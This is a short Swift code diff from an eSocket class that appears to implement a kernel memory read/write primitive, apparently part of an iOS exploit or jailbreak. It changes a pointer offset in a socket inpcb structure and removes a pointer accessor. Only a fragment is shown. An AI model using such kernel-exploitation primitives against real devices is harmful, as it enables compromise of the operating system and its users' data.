@@ -144,7 +144,7 @@ class eSocket {
                     print("[eSocket] Fail to deallocate unused pages.")
                     return false
                 }
-                textPtr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
+                textPtr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp_pcbinfo)))!.loadUnaligned(as: UInt64.self)
                 return true
             }
             print("[eSocket] Object not found, retrying.")
@@ -171,10 +171,6 @@ class eSocket {
         let ptr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!
         ptr.storeBytes(of: UInt64(stashedAddr), as: UInt64.self)
         stashedAddr = 0
-    }
-    
-    func getPointer() -> UInt64 {
-        return textPtr
     }
     
     func get32B(address: UInt64) -> icmp6_filter? {
